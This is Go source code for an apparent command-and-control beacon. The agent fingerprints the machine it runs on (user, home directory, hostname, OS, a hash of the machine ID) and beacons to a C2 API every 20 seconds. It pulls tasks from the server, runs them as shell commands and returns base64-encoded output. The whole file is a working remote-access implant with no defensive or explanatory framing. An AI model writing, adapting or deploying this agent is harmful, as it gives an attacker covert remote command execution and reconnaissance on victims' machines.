package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/denisbrodbeck/machineid"
)

type Result struct {
	Command  string `json:"command"`
	Beaconid string `json:"beacon_id"`
	Type     string `json:"type"`
	Input    string `json:"input"`
	Taskid   string `json:"task_id"`
	Output   string `json:"output"`
}

// Define Base URL
var base_url = "http://localhost:5000/api/v1/ping"

// Get details from userspace
var user_object, user_error = user.Current()
var beacon_username = user_object.Username
var beacon_directory = user_object.HomeDir

// Get basic OS info (platform, hostname etc)
var beacon_hostname, hostname_error = os.Hostname()
var beacon_platform = runtime.GOOS
var beacon_id = ""

// Default timeout for beacon
var beacon_timer int = 20
var exit_process = false

// Map variable functions to map, used to call function by string-based variable
var function_mapping = map[string]func(string) string{
	"exec_shell": exec_shell,
}

func main() {
	// Generate global beacon_id and start beaconin process (same thread)
	generate_id()
	start_beacon()
}

func exec_shell(input string) string {
	args := strings.Fields(input)
	arguments := strings.Join(args[1:], " ")
	output, err := exec.Command(args[0], arguments).Output()
	if err != nil {
		error := fmt.Sprint(err)
		return string(error)
	} else {
		return string(output)
	}
}

func generate_id() {
	// Generate unique beacon ID based on machine ID and Username
	machine_id, machine_error := machineid.ID()
	if machine_error != nil {
		os.Exit(3)
	}

	// Concat machine ID and username and generate SHA1 hash as beacon_id
	concat_id := machine_id + beacon_username
	base_sha := sha1.New()
	base_sha.Write([]byte(concat_id))
	beacon_id = hex.EncodeToString(base_sha.Sum(nil))
}

func beacon_data() []byte {
	// Create default mapping of core agent data
	base_content := map[string]interface{}{"beacon_id": beacon_id, "working_dir": beacon_directory,
		"username": beacon_username, "hostname": beacon_hostname, "platform": beacon_platform,
		"timer": beacon_timer, "data": map[string]string{}}
	json_content, _ := json.Marshal(base_content)
	return json_content
}

func send_result(task_result []byte) {
	// Send core agent data to back-end API
	response, response_error := http.Post(base_url, "application/json", bytes.NewBuffer(task_result))
	if response_error != nil {
		_ = response_error
		_ = response
	}
}

func execute_tasks(task_iod string, commands []interface{}) {
	// Execute tasks in ordered list / synchronous
	for _, commands := range commands {
		command_mapping := commands.(map[string]interface{})
		cmd_sleep := command_mapping["sleep"].(float64)
		cmd_name := command_mapping["name"].(string)
		cmd_input := command_mapping["input"].(string)
		cmd_output := function_mapping[cmd_name](cmd_input)

		result := &Result{
			Taskid:   task_iod,
			Type:     "manual",
			Beaconid: beacon_id,
			Command:  cmd_name,
			Input:    cmd_input,
			Output:   base64.StdEncoding.EncodeToString([]byte(cmd_output)),
		}

		time.Sleep(time.Duration(cmd_sleep) * time.Second)
		json_object, _ := json.Marshal(result)
		send_result(json_object)

	}
}

func send_pulse() interface{} {
	// Send core agent data to back-end API
	core_json := beacon_data()
	response, response_error := http.Post(base_url, "application/json", bytes.NewBuffer(core_json))
	if response_error != nil {
		_ = response_error
	}
	// Parse HTTP response content
	response_content, read_error := ioutil.ReadAll(response.Body)
	if read_error != nil {
		_ = read_error
	}
	// Parse response content as JSON and convert to interface mapping
	var json_values interface{}
	json_response := json.Unmarshal(response_content, &json_values)
	if json_response != nil {
		_ = json_response
	}
	return json_values
}

func start_pulse() {
	// Send pulse and start threads to execute tasks
	pulse_result := send_pulse()
	task_list := pulse_result.([]interface{})
	for _, task := range task_list {
		task_mapping := task.(map[string]interface{})
		task_id := task_mapping["_id"].(map[string]interface{})
		task_iod := task_id["$oid"].(string)
		commands := task_mapping["commands"].([]interface{})
		go execute_tasks(task_iod, commands)
	}

}

func start_beacon() {
	// Run beaconing process and spawn threads after execution
	// Sleep for X seconds defined by timer
	for exit_process == false {
		go start_pulse()
		time.Sleep(time.Duration(beacon_timer) * time.Second)
	}
}
